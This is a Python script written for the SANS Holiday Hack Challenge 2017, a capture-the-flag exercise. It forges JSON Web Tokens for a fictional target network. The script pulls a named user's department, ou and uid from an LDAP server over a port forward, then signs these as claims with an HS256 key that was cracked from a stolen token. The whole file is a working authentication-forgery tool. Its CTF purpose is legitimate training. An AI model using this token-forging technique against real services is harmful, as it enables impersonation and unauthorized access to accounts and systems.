#!/usr/bin/python2
#
# Forge a JSON Web Token for the SANS Holiday Hack Challenge 2017
# Written by Jason Testart; December 24, 2017
#
# Given the name of a user, search the EDB LDAP server for the user's
# attributes and forge a JSON Web Token using the key cracked
# from the stolen JWT.
#
# This program assumes localhost:389 is forwarding to the EDB server
# in the northpolechristmastown internal network.
#
import sys
import jwt
import ldap
import datetime


def getDirectoryAttributes(searchParam):

    # LDAP attributes needed by the JWT
    # Note LDAP 'department' is 'dept' in the JWT claim
    attributeList=['department','ou','uid']

    # We got this from the LDAP template
    searchBase='dc=northpolechristmastown,dc=com'

    # Assume we're port forwarding localhost:389 to the edb LDAP server
    l = ldap.open('127.0.0.1') 
    try:
        l.simple_bind()
    except ldap.LDAPError as e:
        exit('LDAP bind failed: %s' % e)

    # Convert provided name to lower and search the common name and given name
    # attributes.
    searchFilter = '(|(cn=%s)(gn=%s))' % (searchParam.lower(),searchParam.lower())

    try:
        searchResultID = l.search(searchBase,ldap.SCOPE_SUBTREE, searchFilter, attributeList)
    except ldap.LDAPError as e:
        sys.exit('LDAP search failed: %s' % e)

    tokenDict = {}
    while 1:
        resultType, resultData = l.result(searchResultID, 0)
        if (resultData == []):
            break
        else:
            # Making lots of assumptions here about lone entries
            # and single-valued attributes.
            if resultType == ldap.RES_SEARCH_ENTRY:
                tokenDict['dept'] = resultData[0][1]['department'].pop()
                tokenDict['ou'] = resultData[0][1]['ou'].pop()
                tokenDict['uid'] = resultData[0][1]['uid'].pop()

    return tokenDict

##
## MAIN
##

# This is the key we got from using 'bleeding' john against the stolen JWT
key='3lv3s'

if len(sys.argv) != 2:
    exit('Usage: forgeJWT.py <name>')

claims = {}
claims = getDirectoryAttributes(sys.argv[1])
if not claims:
    exit('User not found in LDAP')

# Hopefully the expiry is reasonable
claims['expires'] = str(datetime.datetime.utcnow() + datetime.timedelta(days=15))

print 'Generating forged JWT with the following claims:'
print claims
print '--'
jwtToken = jwt.encode(claims,key,algorithm='HS256')
print jwtToken
